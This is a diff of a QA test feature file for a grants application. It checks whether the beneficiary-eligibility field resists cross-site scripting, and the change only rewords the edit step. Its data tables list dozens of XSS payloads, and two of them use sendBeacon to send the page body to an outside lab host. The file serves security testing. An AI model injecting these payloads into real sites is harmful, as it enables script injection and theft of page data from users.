@@ -17,7 +17,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     And I enter value "Test_Description" into field "fieldBeneficiaryEligibility__c"
     When I click on "Save" in the page details
     And I pause execution for "5" seconds
@@ -41,7 +41,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                 | Field                          |
       | <xss onafterscriptexecute=alert(1)><script>1</script> | fieldBeneficiaryEligibility__c |
@@ -66,7 +66,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                           | Field                          |
       | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss> | fieldBeneficiaryEligibility__c |
@@ -92,7 +92,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                      | Field                          |
       | <style>keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
@@ -118,7 +118,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                           | Field                          |
       | <style>keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
@@ -144,7 +144,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                        | Field                          |
       | <style>keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
@@ -170,7 +170,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                               | Field                          |
       | <body onbeforeprint=console.log(1)> | fieldBeneficiaryEligibility__c |
@@ -196,7 +196,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                  | Field                          |
       | <xss onbeforescriptexecute=alert(1)><script>1</script> | fieldBeneficiaryEligibility__c |
@@ -222,7 +222,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                     | Field                          |
       | <body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldBeneficiaryEligibility__c |
@@ -248,7 +248,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                  | Field                          |
       | <svg><animate onbegin=alert(1) attributeName=x dur=1s> | fieldBeneficiaryEligibility__c |
@@ -274,7 +274,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                          |
       | <marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee> | fieldBeneficiaryEligibility__c |
@@ -300,7 +300,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                            | Field                          |
       | <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -326,7 +326,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                   | Field                          |
       | <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video> | fieldBeneficiaryEligibility__c |
@@ -352,7 +352,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value             | Field                          |
       | {testData:script} | fieldBeneficiaryEligibility__c |
@@ -378,7 +378,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                         | Field                          |
       | <audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldBeneficiaryEligibility__c |
@@ -404,7 +404,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                          |
       | <svg><animate onend=alert(1) attributeName=x dur=1s> | fieldBeneficiaryEligibility__c |
@@ -430,7 +430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                            | Field                          |
       | <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -456,7 +456,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                        | Field                          |
       | <audio src/onerror=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -482,7 +482,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                          |
       | <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee> | fieldBeneficiaryEligibility__c |
@@ -508,7 +508,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                    | Field                          |
       | <a id=x tabindex=1 onfocus=alert(1)></a> | fieldBeneficiaryEligibility__c |
@@ -534,7 +534,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                          |
       | <a id=x tabindex=1 onfocusin=alert(1)></a> | fieldBeneficiaryEligibility__c |
@@ -560,7 +560,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                         | Field                          |
       | <body onhashchange="print()"> | fieldBeneficiaryEligibility__c |
@@ -586,7 +586,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                  | Field                          |
       | <body onload=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -612,7 +612,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                  | Field                          |
       | <body onload=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -638,7 +638,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                             | Field                          |
       | <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -664,7 +664,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                    | Field                          |
       | <body onmessage=print()> | fieldBeneficiaryEligibility__c |
@@ -690,7 +690,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                    | Field                          |
       | <body onmessage=print()> | fieldBeneficiaryEligibility__c |
@@ -716,7 +716,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                  | Field                          |
       | <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -742,7 +742,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                     | Field                          |
       | <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -768,7 +768,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                     | Field                          |
       | <body onpopstate=print()> | fieldBeneficiaryEligibility__c |
@@ -794,7 +794,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                   | Field                          |
       | <audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldBeneficiaryEligibility__c |
@@ -820,7 +820,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                   | Field                          |
       | <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /> | fieldBeneficiaryEligibility__c |
@@ -846,7 +846,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                     | Field                          |
       | <body onresize="print()"> | fieldBeneficiaryEligibility__c |
@@ -872,7 +872,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                   | Field                          |
       | <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div> | fieldBeneficiaryEligibility__c |
@@ -898,7 +898,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                          |
       | <marquee onstart=alert(1)>XSS</marquee> | fieldBeneficiaryEligibility__c |
@@ -924,7 +924,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                          |
       | <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -950,7 +950,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                          | Field                          |
       | <details ontoggle=alert(1) open>test</details> | fieldBeneficiaryEligibility__c |
@@ -976,7 +976,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                        | Field                          |
       | <style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss> | fieldBeneficiaryEligibility__c |
@@ -1002,7 +1002,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                              | Field                          |
       | <xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss> | fieldBeneficiaryEligibility__c |
@@ -1028,7 +1028,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                       | Field                          |
       | <style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss> | fieldBeneficiaryEligibility__c |
@@ -1054,7 +1054,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                      | Field                          |
       | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss> | fieldBeneficiaryEligibility__c |
@@ -1080,7 +1080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                               | Field                          |
       | <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> | fieldBeneficiaryEligibility__c |
@@ -1106,7 +1106,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                               | Field                          |
       | <body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldBeneficiaryEligibility__c |
@@ -1132,7 +1132,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                            | Field                          |
       | <style>keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
@@ -1158,7 +1158,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                 | Field                          |
       | <style>keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
@@ -1184,7 +1184,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                              | Field                          |
       | <style>keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
@@ -1210,7 +1210,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                              | Field                          |
       | <style>keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
@@ -1236,7 +1236,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                          | Field                          |
       | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss> | fieldBeneficiaryEligibility__c |
@@ -1262,7 +1262,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                        | Field                          |
       | <body onafterprint=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -1288,7 +1288,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                       | Field                          |
       | <input onauxclick=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -1314,7 +1314,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                               | Field                          |
       | <a onbeforecopy="alert(1)" contenteditable>test</a> | fieldBeneficiaryEligibility__c |
@@ -1340,7 +1340,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                              | Field                          |
       | <a onbeforecut="alert(1)" contenteditable>test</a> | fieldBeneficiaryEligibility__c |
@@ -1366,7 +1366,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                        | Field                          |
       | <xss contenteditable onbeforeinput=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -1391,7 +1391,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                    | Field                          |
       | <xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme> | fieldBeneficiaryEligibility__c |
@@ -1417,7 +1417,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                               | Field                          |
       | <input onchange=alert(1) value=xss> | fieldBeneficiaryEligibility__c |
@@ -1443,7 +1443,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                  | Field                          |
       | <xss onclick="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1469,7 +1469,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                         | Field                          |
       | <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form> | fieldBeneficiaryEligibility__c |
@@ -1495,7 +1495,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                        | Field                          |
       | <xss oncontextmenu="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1521,7 +1521,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                      | Field                          |
       | <xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block> | fieldBeneficiaryEligibility__c |
@@ -1547,7 +1547,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                          |
       | <xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block> | fieldBeneficiaryEligibility__c |
@@ -1573,7 +1573,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                          | Field                          |
       | <xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1598,7 +1598,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                  | Field                          |
       | <xss draggable="true" ondrag="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1623,7 +1623,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                          |
       | <xss draggable="true" ondragend="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1648,7 +1648,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                       | Field                          |
       | <xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1673,7 +1673,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                       | Field                          |
       | <xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1698,7 +1698,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
